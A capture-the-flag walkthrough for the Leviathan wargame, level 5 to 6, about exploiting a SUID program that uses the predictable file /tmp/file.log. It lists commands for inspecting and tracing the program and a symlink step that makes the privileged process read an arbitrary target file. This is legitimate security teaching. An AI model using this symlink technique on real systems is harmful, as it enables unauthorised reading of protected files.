# Leviathan Level 5 → Level 6

## Objective

Analyze a SUID program that uses a predictable temporary file.

## Walkthrough

Inspect the available files:

```bash
ls -la
ls -la .trash
```

Run the executable:

```bash
./.trash/leviathan5
```

It complains about `/tmp/file.log`.

Trace its behavior:

```bash
ltrace ./.trash/leviathan5
strace ./.trash/leviathan5
```

The important observation is that a privileged process uses a predictable file under `/tmp`.

Create a symbolic link with the expected name, pointing at a file the privileged process should be able to read:

```bash
ln -s <target> /tmp/file.log
```

Run the SUID program again:

```bash
./.trash/leviathan5
```

Because the program does not safely handle the temporary path, the privileged process follows the symbolic link.

This demonstrates why predictable temporary files are dangerous in privileged programs.

## Key Concepts

- Symbolic links
- `/tmp`
- SUID
- `ltrace`
- `strace`
- Unsafe temporary-file handling
